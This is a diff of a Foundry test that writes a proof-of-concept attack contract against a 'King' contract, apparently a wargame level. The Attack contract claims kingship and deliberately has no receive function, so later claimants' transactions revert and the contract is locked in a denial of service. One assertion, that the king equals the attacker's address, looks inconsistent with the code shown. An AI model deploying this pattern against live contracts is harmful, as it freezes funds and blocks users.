@@ -4,25 +4,35 @@ import "@forge-std/Test.sol";
 import {King} from "../src/King.sol";
 
 contract Attack {
-    constructor() {
-
-    }
-
-    receive() external payable {
-        
+    King public king;
+    constructor(address payable kingAddress) payable {
+        uint prize = King(kingAddress).prize();
+        (bool ok,) = kingAddress.call{value: prize}("");
+        require(ok, "call failed");
     }
 }
+
 contract KingTest is Test {
     King public kingContract;
     address public attacker;
+    address public user;
 
     function setUp() public {
         attacker = vm.addr(1);
-        kingContract =  new King();    
+        user = vm.addr(2);
+        kingContract =  new King{value: 100 wei}();    
     }
     function testExploit() public {
         vm.startPrank(attacker);
-        
+        Attack attack = new Attack(payable(kingContract));
+        assertEq(kingContract._king(), attacker);
+        vm.stopPrank();
+
+        uint prize =  kingContract.prize();
+
+        vm.startPrank(user);
+        vm.expectRevert();
+        payable(kingContract).call{value: prize}("");
         vm.stopPrank();
     }
 }
